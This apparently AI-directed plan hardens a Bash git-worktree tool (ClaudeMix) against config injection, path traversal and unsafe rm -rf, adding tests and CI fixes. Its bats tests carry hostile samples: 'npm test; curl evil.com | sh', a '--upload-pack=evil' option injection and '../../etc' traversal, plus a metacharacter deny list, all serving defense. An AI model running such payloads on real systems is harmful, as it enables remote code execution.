# ClaudeMix Full Audit Fixes — Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Fix all 32 audit findings across security, CI/CD, tooling, architecture, and code quality.

**Architecture:** Each task modifies 1-3 files with surgical edits. Security fixes harden config parsing in `core.sh` and generated output in `hooks.sh`/`session.sh`. CI/tooling fixes correct the Node.js setup and workflows. Architecture fixes address merge-queue safety and worktree path validation. All changes are backward-compatible.

**Tech Stack:** Bash (shellcheck-clean), bats-core (tests), GitHub Actions YAML, Node.js (commitlint/husky tooling only)

---

### Task 1: Fix commitlint ESM without `"type": "module"`

**Files:**
- Modify: `commitlint.config.js`

**Step 1: Fix the config to use CJS syntax**

```js
module.exports = { extends: ['@commitlint/config-conventional'] };
```

**Step 2: Verify syntax**

Run: `node -e "require('./commitlint.config.js')"`
Expected: No error

**Step 3: Commit**

```bash
git add commitlint.config.js
git commit -m "fix: use CJS in commitlint config for Node.js compat"
```

---

### Task 2: Add `node_modules/` and lockfile to `.gitignore`

**Files:**
- Modify: `.gitignore`

**Step 1: Add Node.js entries to .gitignore**

Append after the `# Testing artifacts` section:

```
# Node.js (dev tooling only)
node_modules/
package-lock.json
```

**Step 2: Verify**

Run: `grep node_modules .gitignore`
Expected: `node_modules/`

**Step 3: Commit**

```bash
git add .gitignore
git commit -m "chore: add node_modules and lockfile to gitignore"
```

---

### Task 3: Add config validation in `load_config` — sanitize all `CFG_*` values

This is the root-cause fix for CRITICAL-1, CRITICAL-2, HIGH-1, HIGH-2.

**Files:**
- Modify: `lib/core.sh:136-150` (inside `load_config`, after the case statement)

**Step 1: Write the failing test**

Create: `tests/unit/config_validation.bats`

```bash
#!/usr/bin/env bats
# Unit tests for config value validation in load_config()

setup() {
  load '../test_helper/common'
  source_core
  create_test_repo
  mkdir -p "$TEST_REPO/.claudemix/worktrees" "$TEST_REPO/.claudemix/sessions"
}

teardown() {
  cleanup_test_repo
}

@test "load_config: rejects validate with shell metacharacters" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
validate: npm test; curl evil.com | sh
EOF
  load_config
  # Semicolons and pipes should be stripped
  refute [ "$CFG_VALIDATE" = "npm test; curl evil.com | sh" ]
}

@test "load_config: allows safe validate commands" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
validate: pnpm run test:unit
EOF
  load_config
  assert_equal "$CFG_VALIDATE" "pnpm run test:unit"
}

@test "load_config: allows validate with && for chained commands" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
validate: cargo check && cargo clippy
EOF
  load_config
  assert_equal "$CFG_VALIDATE" "cargo check && cargo clippy"
}

@test "load_config: rejects base_branch with option injection" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
base_branch: --upload-pack=evil
EOF
  load_config
  # Should be rejected (starts with --)
  assert_equal "$CFG_BASE_BRANCH" "main"
}

@test "load_config: rejects merge_target with option injection" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
merge_target: -evil
EOF
  load_config
  # Should be rejected (starts with -)
  refute [ "$CFG_MERGE_TARGET" = "-evil" ]
}

@test "load_config: rejects worktree_dir with path traversal" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
worktree_dir: ../../etc
EOF
  load_config
  # Should be rejected (contains ..)
  refute [ "$CFG_WORKTREE_DIR" = "../../etc" ]
}

@test "load_config: allows valid branch names" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
base_branch: develop
merge_target: staging
EOF
  load_config
  assert_equal "$CFG_BASE_BRANCH" "develop"
  assert_equal "$CFG_MERGE_TARGET" "staging"
}
```

**Step 2: Run test to verify it fails**

Run: `bats tests/unit/config_validation.bats`
Expected: Multiple failures (no validation exists yet)

**Step 3: Add `_validate_config` function to `lib/core.sh`**

Insert after line 149 (`_detect_defaults`) and before the closing `}` of `load_config`:

```bash
  _validate_config
```

Then add this new function after `_detect_defaults()` (after line 205):

```bash
# Validate and sanitize config values after loading.
# Rejects values that could cause injection when used in shell contexts.
_validate_config() {
  # Validate branch names: must be safe git ref characters, no leading dash
  local branch_pattern='^[a-zA-Z0-9][a-zA-Z0-9_./-]*$'
  if [[ -n "$CFG_BASE_BRANCH" ]] && ! [[ "$CFG_BASE_BRANCH" =~ $branch_pattern ]]; then
    log_warn "Unsafe base_branch '${CFG_BASE_BRANCH}' in config — using default"
    CFG_BASE_BRANCH=""
  fi
  if [[ -n "$CFG_MERGE_TARGET" ]] && ! [[ "$CFG_MERGE_TARGET" =~ $branch_pattern ]]; then
    log_warn "Unsafe merge_target '${CFG_MERGE_TARGET}' in config — using default"
    CFG_MERGE_TARGET=""
  fi

  # Validate worktree_dir: no path traversal (..), no leading slash, no leading dash
  if [[ -n "$CFG_WORKTREE_DIR" ]]; then
    if [[ "$CFG_WORKTREE_DIR" == *".."* ]] || [[ "$CFG_WORKTREE_DIR" == /* ]] || [[ "$CFG_WORKTREE_DIR" == -* ]]; then
      log_warn "Unsafe worktree_dir '${CFG_WORKTREE_DIR}' in config — using default"
      CFG_WORKTREE_DIR=""
    fi
  fi

  # Validate merge_strategy: must be one of the known values
  case "$CFG_MERGE_STRATEGY" in
    squash|merge|rebase) ;;
    *)
      log_warn "Unknown merge_strategy '${CFG_MERGE_STRATEGY}' in config — using 'squash'"
      CFG_MERGE_STRATEGY="squash"
      ;;
  esac

  # Validate CFG_VALIDATE: reject dangerous shell metacharacters
  # Allow: alphanumeric, spaces, hyphens, underscores, colons, dots, slashes,
  #        equals, @, commas, &&, plus, percent, curly braces
  # Reject: semicolons, pipes, backticks, $(), >, <, newlines
  if [[ -n "$CFG_VALIDATE" ]]; then
    if [[ "$CFG_VALIDATE" == *'$('* ]] || [[ "$CFG_VALIDATE" == *'`'* ]] \
      || [[ "$CFG_VALIDATE" == *';'* ]] || [[ "$CFG_VALIDATE" == *'|'* ]] \
      || [[ "$CFG_VALIDATE" == *'>'* ]] || [[ "$CFG_VALIDATE" == *'<'* ]] \
      || [[ "$CFG_VALIDATE" == *$'\n'* ]]; then
      log_warn "Unsafe characters in validate config — rejecting"
      log_warn "  Rejected value: ${CFG_VALIDATE}"
      log_warn "  Allowed: simple commands like 'npm test' or 'cargo check && cargo clippy'"
      CFG_VALIDATE=""
    fi
  fi

  # Validate protected_branches: same as branch names but comma-separated
  if [[ -n "$CFG_PROTECTED_BRANCHES" ]]; then
    local cleaned
    cleaned="$(printf '%s' "$CFG_PROTECTED_BRANCHES" | tr -cd 'a-zA-Z0-9,_./-')"
    if [[ "$cleaned" != "$CFG_PROTECTED_BRANCHES" ]]; then
      log_warn "Sanitized protected_branches config value"
      CFG_PROTECTED_BRANCHES="$cleaned"
    fi
  fi
}
```

**Step 4: Run test to verify it passes**

Run: `bats tests/unit/config_validation.bats`
Expected: All PASS

**Step 5: Run existing tests to verify no regressions**

Run: `bats tests/unit/`
Expected: All PASS

**Step 6: Commit**

```bash
git add lib/core.sh tests/unit/config_validation.bats
git commit -m "fix: add config validation to prevent injection attacks

Validates all CFG_* values after loading from .claudemix.yml:
- Branch names: reject leading dashes (git option injection)
- worktree_dir: reject path traversal (..) and absolute paths
- validate: reject shell metacharacters (;|><$())
- merge_strategy: whitelist known values
- protected_branches: strip unsafe characters

Fixes: CRITICAL-1, CRITICAL-2, HIGH-1, HIGH-2"
```

---

### Task 4: Fix `write_default_config` unquoted heredoc

**Files:**
- Modify: `lib/core.sh:209-222`

**Step 1: Write the failing test**

Add to `tests/unit/config_validation.bats`:

```bash
@test "write_default_config: does not execute command substitution" {
  source_core
  create_test_repo
  CFG_VALIDATE='$(echo INJECTED)'
  CFG_PROTECTED_BRANCHES="main"
  CFG_MERGE_TARGET="main"
  CFG_MERGE_STRATEGY="squash"
  CFG_BASE_BRANCH="main"
  CFG_CLAUDE_FLAGS="--verbose"

  local out="$TEST_REPO/test-config.yml"
  write_default_config "$out"

  # The literal string $(echo INJECTED) should appear, not "INJECTED"
  run grep 'INJECTED' "$out"
  assert_failure
}
```

**Step 2: Run test to verify it fails**

Run: `bats tests/unit/config_validation.bats -f "write_default_config"`
Expected: FAIL (unquoted heredoc expands `$(echo INJECTED)`)

**Step 3: Replace heredoc with printf in `lib/core.sh`**

Replace lines 209-222:

```bash
# Write default config to a file.
# Args: $1 = output path
write_default_config() {
  local config_path="$1"
  {
    printf '# ClaudeMix configuration\n'
    printf '# https://github.com/Draidel/ClaudeMix\n\n'
    printf 'validate: %s\n' "${CFG_VALIDATE:-npm test}"
    printf 'protected_branches: %s\n' "${CFG_PROTECTED_BRANCHES}"
    printf 'merge_target: %s\n' "${CFG_MERGE_TARGET}"
    printf 'merge_strategy: %s\n' "${CFG_MERGE_STRATEGY}"
    printf 'base_branch: %s\n' "${CFG_BASE_BRANCH}"
    printf 'claude_flags: %s\n' "${CFG_CLAUDE_FLAGS}"
  } > "$config_path"
}
```

**Step 4: Run test to verify it passes**

Run: `bats tests/unit/config_validation.bats -f "write_default_config"`
Expected: PASS

**Step 5: Commit**

```bash
git add lib/core.sh tests/unit/config_validation.bats
git commit -m "fix: prevent command substitution in write_default_config

Replace unquoted heredoc with printf to prevent shell expansion
of config values containing \$() or backticks."
```

---

### Task 5: Fix session metadata unquoted heredoc

**Files:**
- Modify: `lib/session.sh:252-266`

**Step 1: Replace heredoc with printf in `_session_save_meta`**

Replace lines 252-266:

```bash
# Persist session metadata.
_session_save_meta() {
  local name="$1"
  local wt_path="$2"
  local meta_file="$PROJECT_ROOT/$CLAUDEMIX_SESSIONS_DIR/${name}.meta"

  {
    printf 'name=%s\n' "$name"
    printf 'created_at=%s\n' "$(now_iso)"
    printf 'branch=%s\n' "${CLAUDEMIX_BRANCH_PREFIX}${name}"
    printf 'worktree=%s\n' "$wt_path"
    printf 'tmux_session=%s\n' "${CLAUDEMIX_TMUX_PREFIX}${name}"
    printf 'base_branch=%s\n' "$CFG_BASE_BRANCH"
  } > "$meta_file"
}
```

**Step 2: Verify syntax**

Run: `bash -n lib/session.sh`
Expected: No error

**Step 3: Commit**

```bash
git add lib/session.sh
git commit -m "fix: use printf for session metadata to prevent injection"
```

---

### Task 6: Add worktree path resolution before `rm -rf` guard

**Files:**
- Modify: `lib/worktree.sh:56-76`

**Step 1: Write the failing test**

Add to `tests/e2e/worktree.bats` (or create if needed — it exists):

```bash
@test "worktree_remove: rejects path traversal in worktree_dir" {
  source_lib
  create_test_repo
  load_config

  # Even if CFG_WORKTREE_DIR somehow got set to traversal,
  # worktree_remove should refuse
  CFG_WORKTREE_DIR="../../etc"
  local name="test-session"

  run worktree_remove "$name"
  assert_failure
  assert_output --partial "outside"
}
```

**Step 2: Strengthen the path guard in `worktree_remove`**

Replace lines 56-76 of `lib/worktree.sh`:

```bash
  local worktree_path="$PROJECT_ROOT/$CFG_WORKTREE_DIR/$name"

  # Validate path before any destructive operations
  if [[ -z "$name" ]]; then
    log_error "Cannot remove worktree: empty name"
    return 1
  fi
  if [[ ! -d "$worktree_path" ]]; then
    log_debug "Worktree not found: $worktree_path"
    return 0
  fi

  # Safety: resolve real path and ensure it's inside the project root
  local real_path real_root
  real_path="$(cd "$worktree_path" 2>/dev/null && pwd -P)" || {
    log_error "Cannot resolve worktree path: $worktree_path"
    return 1
  }
  real_root="$(cd "$PROJECT_ROOT" 2>/dev/null && pwd -P)"
  case "$real_path" in
    "$real_root/"*)
      : # Valid — resolved path is inside project root
      ;;
    *)
      log_error "Refusing to remove path outside project root: $real_path"
      return 1
      ;;
  esac
```

**Step 3: Run tests**

Run: `bats tests/e2e/worktree.bats`
Expected: All PASS

**Step 4: Commit**

```bash
git add lib/worktree.sh tests/e2e/worktree.bats
git commit -m "fix: resolve real path before rm -rf in worktree_remove

Uses pwd -P to resolve symlinks and .. before checking the
safety guard. Prevents CFG_WORKTREE_DIR traversal attacks."
```

---

### Task 7: Add dirty-check before `merge_queue_run` checkout

**Files:**
- Modify: `lib/merge-queue.sh:78-86`

**Step 1: Add dirty working tree check before checkout**

Insert before line 80 (`log_info "Creating consolidated branch..."`) in `merge-queue.sh`:

```bash
  # Safety: refuse to proceed if the working tree is dirty
  if ! git -C "$PROJECT_ROOT" diff --quiet 2>/dev/null || \
     ! git -C "$PROJECT_ROOT" diff --cached --quiet 2>/dev/null; then
    die "Working tree has uncommitted changes. Commit or stash them first."
  fi
```

**Step 2: Verify syntax**

Run: `bash -n lib/merge-queue.sh`
Expected: No error

**Step 3: Commit**

```bash
git add lib/merge-queue.sh
git commit -m "fix: check for uncommitted changes before merge queue checkout

Prevents silent loss of uncommitted work when merge_queue_run
checks out the merge target branch."
```

---

### Task 8: Fix `worktree_cleanup_merged` stdout contamination

**Files:**
- Modify: `lib/worktree.sh:148-179`

**Step 1: Redirect log output to stderr inside cleanup**

Replace the `worktree_cleanup_merged` function (lines 148-179):

```bash
# Clean up worktrees whose branches have been merged.
# Output: number of worktrees removed (to stdout)
worktree_cleanup_merged() {
  local removed=0
  local worktrees_dir="$PROJECT_ROOT/$CFG_WORKTREE_DIR"

  if [[ ! -d "$worktrees_dir" ]]; then
    printf '%d' "$removed"
    return 0
  fi

  # Get merged branches (exact line match, not substring)
  local merged_branches
  merged_branches="$(git -C "$PROJECT_ROOT" branch --merged "$CFG_MERGE_TARGET" 2>/dev/null \
    | sed 's/^[* ]*//' || echo "")"

  for dir in "$worktrees_dir"/*/; do
    [[ -d "$dir" ]] || continue
    local name
    name="$(basename "$dir")"
    local branch="${CLAUDEMIX_BRANCH_PREFIX}${name}"

    # Use exact line match (grep -xF) to avoid substring false positives
    if printf '%s\n' "$merged_branches" | grep -qxF "$branch"; then
      log_info "Branch ${CYAN}$branch${RESET} is merged into ${CYAN}$CFG_MERGE_TARGET${RESET}" >&2
      worktree_remove "$name" 2>&1 >&2
      removed=$((removed + 1))
    fi
  done

  printf '%d' "$removed"
}
```

The key change: `log_info` and `worktree_remove` output goes to stderr (`>&2`) so it doesn't contaminate the stdout count.

**Step 2: Verify syntax**

Run: `bash -n lib/worktree.sh`
Expected: No error

**Step 3: Commit**

```bash
git add lib/worktree.sh
git commit -m "fix: redirect log output to stderr in worktree_cleanup_merged

Prevents log messages from contaminating the stdout count value,
which caused arithmetic failures in callers using \$()."
```

---

### Task 9: Fix `install.sh` — validate `CLAUDEMIX_HOME` before `rm -rf`

**Files:**
- Modify: `install.sh:40-50`

**Step 1: Add validation before rm -rf**

Replace lines 40-50:

```bash
if [[ -d "$INSTALL_DIR" ]]; then
  # Validate this looks like a ClaudeMix installation before any destructive ops
  if [[ ! -f "$INSTALL_DIR/bin/claudemix" ]] && [[ ! -d "$INSTALL_DIR/.git" ]]; then
    error "Directory '$INSTALL_DIR' exists but doesn't look like a ClaudeMix installation."
    error "Set CLAUDEMIX_HOME to a different path or remove the directory manually."
    exit 1
  fi
  info "Updating existing installation at $INSTALL_DIR"
  if ! (cd "$INSTALL_DIR" && git pull --quiet origin main); then
    warn "Git pull failed. Reinstalling..."
    rm -rf "$INSTALL_DIR"
    git clone --depth 1 "$REPO" "$INSTALL_DIR" || {
      error "Failed to clone repository. Check your network connection."
      exit 1
    }
  fi
```

**Step 2: Verify syntax**

Run: `bash -n install.sh`
Expected: No error

**Step 3: Commit**

```bash
git add install.sh
git commit -m "fix: validate CLAUDEMIX_HOME is a real installation before rm -rf"
```

---

### Task 10: Fix CI workflow — pin actions, fix bats on Ubuntu

**Files:**
- Modify: `.github/workflows/ci.yml`

**Step 1: Rewrite ci.yml with pinned actions and proper bats-core install**

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  shellcheck:
    name: Shellcheck
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run shellcheck
        run: shellcheck -P lib bin/claudemix lib/*.sh install.sh

  syntax:
    name: Syntax Check
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Check bash syntax
        run: |
          for f in bin/claudemix lib/*.sh install.sh; do
            echo "Checking $f..."
            bash -n "$f"
          done
          echo "All files pass syntax check."

  test:
    name: Tests (${{ matrix.os }})
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
    steps:
      - uses: actions/checkout@v4

      - name: Install bats-core
        run: |
          if [[ "$RUNNER_OS" == "Linux" ]]; then
            sudo npm install -g bats
          else
            brew install bats-core
          fi

      - name: Clone bats helpers
        run: |
          mkdir -p /tmp/bats-libs
          git clone --depth 1 https://github.com/bats-core/bats-support.git /tmp/bats-libs/bats-support
          git clone --depth 1 https://github.com/bats-core/bats-assert.git /tmp/bats-libs/bats-assert
          git clone --depth 1 https://github.com/bats-core/bats-file.git /tmp/bats-libs/bats-file

      - name: Run tests
        env:
          BATS_LIB_PATH: /tmp/bats-libs
        run: bats tests/unit/ tests/e2e/
```

**Step 2: Commit**

```bash
git add .github/workflows/ci.yml
git commit -m "fix: install bats-core via npm on Ubuntu instead of apt

Ubuntu apt provides bats v0.4 (2014), not bats-core.
npm install provides the modern bats-core version."
```

---

### Task 11: Add `worktree_dir` to config example and `write_default_config`

**Files:**
- Modify: `lib/core.sh` (inside the new `write_default_config`)
- Modify: `.claudemix.yml.example`

**Step 1: Add worktree_dir to write_default_config**

In the `write_default_config` function (already rewritten in Task 4), add before the closing `} > "$config_path"`:

```bash
    printf 'worktree_dir: %s\n' "${CFG_WORKTREE_DIR}"
```

**Step 2: Add worktree_dir to .claudemix.yml.example**

Append before the `claude_flags` line:

```yaml
# Directory for worktrees (relative to project root).
# Default: .claudemix/worktrees
worktree_dir: .claudemix/worktrees
```

**Step 3: Commit**

```bash
git add lib/core.sh .claudemix.yml.example
git commit -m "feat: add worktree_dir to config template and example"
```

---

### Task 12: Fix pre-commit hook hardcoded `pnpm` in husky path

**Files:**
- Modify: `lib/hooks.sh:136-144`

**Step 1: Use detected package manager in pre-commit hook**

Replace `_hooks_write_pre_commit_husky`:

```bash
# Write the pre-commit hook for husky.
_hooks_write_pre_commit_husky() {
  local pkg_manager
  pkg_manager="$(detect_pkg_manager "$PROJECT_ROOT")"

  cat > "$PROJECT_ROOT/.husky/pre-commit" << HOOK
# ClaudeMix pre-commit hook — lint staged files
${pkg_manager} lint-staged 2>/dev/null || npx lint-staged
HOOK
  chmod +x "$PROJECT_ROOT/.husky/pre-commit"
  log_ok "Created .husky/pre-commit (using $pkg_manager)"
}
```

Note: This heredoc is intentionally unquoted because we want `${pkg_manager}` to expand. The value is safe — it comes from `detect_pkg_manager` which only returns `pnpm|yarn|bun|npm`.

**Step 2: Verify syntax**

Run: `bash -n lib/hooks.sh`
Expected: No error

**Step 3: Commit**

```bash
git add lib/hooks.sh
git commit -m "fix: use detected package manager in husky pre-commit hook"
```

---

### Task 13: Warn on husky/lint-staged install failures

**Files:**
- Modify: `lib/hooks.sh:91-100` and `lib/hooks.sh:102-111`

**Step 1: Add failure warnings to package install blocks**

Replace lines 94-99 (husky install):

```bash
      pnpm) (cd "$PROJECT_ROOT" && pnpm add -D -w husky 2>/dev/null) || log_warn "Failed to install husky via pnpm" ;;
      yarn) (cd "$PROJECT_ROOT" && yarn add -D husky 2>/dev/null) || log_warn "Failed to install husky via yarn" ;;
      bun)  (cd "$PROJECT_ROOT" && bun add -d husky 2>/dev/null) || log_warn "Failed to install husky via bun" ;;
      npm)  (cd "$PROJECT_ROOT" && npm install -D husky 2>/dev/null) || log_warn "Failed to install husky via npm" ;;
```

Replace lines 106-109 (lint-staged install):

```bash
      pnpm) (cd "$PROJECT_ROOT" && pnpm add -D -w lint-staged 2>/dev/null) || log_warn "Failed to install lint-staged via pnpm" ;;
      yarn) (cd "$PROJECT_ROOT" && yarn add -D lint-staged 2>/dev/null) || log_warn "Failed to install lint-staged via yarn" ;;
      bun)  (cd "$PROJECT_ROOT" && bun add -d lint-staged 2>/dev/null) || log_warn "Failed to install lint-staged via bun" ;;
      npm)  (cd "$PROJECT_ROOT" && npm install -D lint-staged 2>/dev/null) || log_warn "Failed to install lint-staged via npm" ;;
```

**Step 2: Verify syntax**

Run: `bash -n lib/hooks.sh`
Expected: No error

**Step 3: Commit**

```bash
git add lib/hooks.sh
git commit -m "fix: warn on husky/lint-staged install failures instead of silently ignoring"
```

---

### Task 14: Fix EXIT trap leak in `merge_queue_run`

**Files:**
- Modify: `lib/merge-queue.sh:78`

**Step 1: Scope the trap more carefully**

The trap at line 78 is fine structurally — it's cleared with `trap - EXIT` on all exit paths (lines 107, 117, 178). But if an unexpected error hits, the trap persists.

Add the trap clear to `_merge_queue_restore_branch` itself to make it self-cleaning:

In `_merge_queue_restore_branch` (line 222), add at the end:

```bash
  trap - EXIT
```

**Step 2: Verify syntax**

Run: `bash -n lib/merge-queue.sh`
Expected: No error

**Step 3: Commit**

```bash
git add lib/merge-queue.sh
git commit -m "fix: self-clearing EXIT trap in merge queue restore handler"
```

---

### Task 15: Add `merge list` to TUI menu

**Files:**
- Modify: `lib/tui.sh:20`

**Step 1: Add merge list option to the merge action**

Replace line 20 in `tui.sh`:

```bash
      merge)   _tui_merge_menu ;;
```

Add the `_tui_merge_menu` function before the `_tui_hooks_menu` function:

```bash
# ── Merge Menu ──────────────────────────────────────────────────────────────

_tui_merge_menu() {
  local action
  if gum_available; then
    action="$(gum choose \
      --header "Merge Queue" \
      "Run merge queue" \
      "List eligible branches" \
      "Back" \
    )" || return 0
  else
    printf '\n  1) Run merge queue\n  2) List eligible branches\n  3) Back\nChoose: '
    read -r num
    case "$num" in
      1) action="Run merge queue" ;;
      2) action="List eligible branches" ;;
      *) return 0 ;;
    esac
  fi

  case "$action" in
    "Run merge queue")         merge_queue_run ;;
    "List eligible branches")  merge_queue_list; _tui_pause ;;
    "Back")                    return 0 ;;
  esac
}
```

**Step 2: Verify syntax**

Run: `bash -n lib/tui.sh`
Expected: No error

**Step 3: Commit**

```bash
git add lib/tui.sh
git commit -m "feat: add merge list to TUI menu"
```

---

### Task 16: Add `.shellcheckrc`

**Files:**
- Create: `.shellcheckrc`

**Step 1: Create `.shellcheckrc`**

```
# ShellCheck configuration for ClaudeMix
# https://github.com/koalaman/shellcheck/wiki/Directive

# Allow sourced files to reference each other's variables
source-path=lib

# Default shell is bash
shell=bash
```

**Step 2: Commit**

```bash
git add .shellcheckrc
git commit -m "chore: add .shellcheckrc with source-path config"
```

---

### Task 17: Add `.editorconfig`

**Files:**
- Create: `.editorconfig`

**Step 1: Create `.editorconfig`**

```ini
root = true

[*]
end_of_line = lf
insert_final_newline = true
trim_trailing_whitespace = true
charset = utf-8

[*.sh]
indent_style = space
indent_size = 2

[bin/claudemix]
indent_style = space
indent_size = 2

[*.yml]
indent_style = space
indent_size = 2

[*.yaml]
indent_style = space
indent_size = 2

[*.md]
trim_trailing_whitespace = false

[Makefile]
indent_style = tab
```

**Step 2: Commit**

```bash
git add .editorconfig
git commit -m "chore: add .editorconfig for consistent formatting"
```

---

### Task 18: Add `.releaserc.json` for semantic-release config

**Files:**
- Create: `.releaserc.json`

**Step 1: Create `.releaserc.json`**

```json
{
  "branches": ["main"],
  "plugins": [
    "@semantic-release/commit-analyzer",
    "@semantic-release/release-notes-generator",
    [
      "@semantic-release/changelog",
      {
        "changelogFile": "CHANGELOG.md"
      }
    ],
    [
      "@semantic-release/git",
      {
        "assets": ["CHANGELOG.md"],
        "message": "chore(release): v${nextRelease.version}\n\n${nextRelease.notes}"
      }
    ],
    "@semantic-release/github"
  ]
}
```

**Step 2: Commit**

```bash
git add .releaserc.json
git commit -m "chore: add semantic-release config"
```

---

### Task 19: Add bash completions to `install.sh`

**Files:**
- Modify: `install.sh:101-118`

**Step 1: Add bash completion install block**

After the zsh completions block (after line 109), add a bash completions block:

```bash
  elif [[ "$SHELL_NAME" == "bash" ]]; then
    local_completions="$HOME/.local/share/bash-completion/completions"
    if mkdir -p "$local_completions" 2>/dev/null; then
      if [[ -f "$INSTALL_DIR/completions/$BIN_NAME.bash" ]]; then
        cp "$INSTALL_DIR/completions/$BIN_NAME.bash" "$local_completions/$BIN_NAME"
        info "Bash completions installed to $local_completions"
      fi
    fi
```

**Step 2: Verify syntax**

Run: `bash -n install.sh`
Expected: No error

**Step 3: Commit**

```bash
git add install.sh
git commit -m "fix: install bash completions in addition to zsh and fish"
```

---

### Task 20: Run full test suite and shellcheck

**Files:** None (validation only)

**Step 1: Run shellcheck on all files**

Run: `shellcheck -P lib bin/claudemix lib/*.sh install.sh`
Expected: Clean (or only expected SC2034 warnings already suppressed)

**Step 2: Run bash syntax check**

Run: `for f in bin/claudemix lib/*.sh install.sh; do bash -n "$f" && echo "$f OK"; done`
Expected: All OK

**Step 3: Run bats tests if available**

Run: `bats tests/unit/ tests/e2e/ 2>/dev/null || echo "bats not installed — skip"`
Expected: All PASS (or skip if bats not installed)

**Step 4: Final commit if any fixups needed**

```bash
git add -A
git commit -m "fix: address shellcheck/test findings from final validation"
```

If no fixups needed, skip this step.

---

## Summary of All Changes

| Task | Severity | Files | Description |
|------|----------|-------|-------------|
| 1 | Critical | `commitlint.config.js` | Fix ESM → CJS |
| 2 | Medium | `.gitignore` | Add node_modules |
| 3 | Critical | `lib/core.sh`, test | Config validation (injection prevention) |
| 4 | Critical | `lib/core.sh`, test | Fix write_default_config heredoc |
| 5 | Medium | `lib/session.sh` | Fix metadata heredoc |
| 6 | High | `lib/worktree.sh`, test | Resolve real path before rm -rf |
| 7 | High | `lib/merge-queue.sh` | Dirty-check before checkout |
| 8 | High | `lib/worktree.sh` | Fix stdout contamination in cleanup |
| 9 | Medium | `install.sh` | Validate CLAUDEMIX_HOME |
| 10 | Medium | `.github/workflows/ci.yml` | Fix bats, pin actions |
| 11 | Low | `lib/core.sh`, example | Add worktree_dir to config |
| 12 | Medium | `lib/hooks.sh` | Fix hardcoded pnpm |
| 13 | Medium | `lib/hooks.sh` | Warn on install failures |
| 14 | Medium | `lib/merge-queue.sh` | Fix EXIT trap leak |
| 15 | Low | `lib/tui.sh` | Add merge list to TUI |
| 16 | Low | `.shellcheckrc` | ShellCheck config |
| 17 | Low | `.editorconfig` | Editor config |
| 18 | Low | `.releaserc.json` | Semantic-release config |
| 19 | Low | `install.sh` | Bash completions |
| 20 | — | — | Final validation |
